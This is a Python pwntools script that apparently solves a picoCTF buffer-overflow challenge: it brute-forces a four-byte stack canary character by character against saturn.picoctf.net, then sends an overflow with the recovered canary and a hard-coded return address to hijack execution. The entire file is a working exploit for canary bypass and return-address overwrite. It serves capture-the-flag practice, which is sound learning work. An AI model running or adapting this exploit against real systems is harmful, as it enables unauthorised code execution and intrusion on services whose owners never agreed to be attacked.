from pwn import *
import struct
import string
import binascii

def send_payload(payload):
    conn = remote("saturn.picoctf.net", 51912)
    conn.recvuntil("> ")
    conn.sendline(str(len(payload)))
    conn.recvuntil("> ")
    conn.sendline(payload)
    response = conn.recvall()
    conn.close()
    return b"Stack Smashing" not in response, response

alphabet = string.ascii_letters

canary = ""
for i in range(4):
    for char in alphabet:
        candidate = canary + char
        success, res = send_payload(("A" * 64) + candidate)
        if success:
            canary += char
            print(canary)
            break
    if len(canary) != i + 1:
        print("Could not find canary value")
        break

success, res = send_payload((b"A" * 64) + canary.encode("utf-8") + (b"A" * 16) + b"\x36\x93\x04\x08")
assert success
print(res)
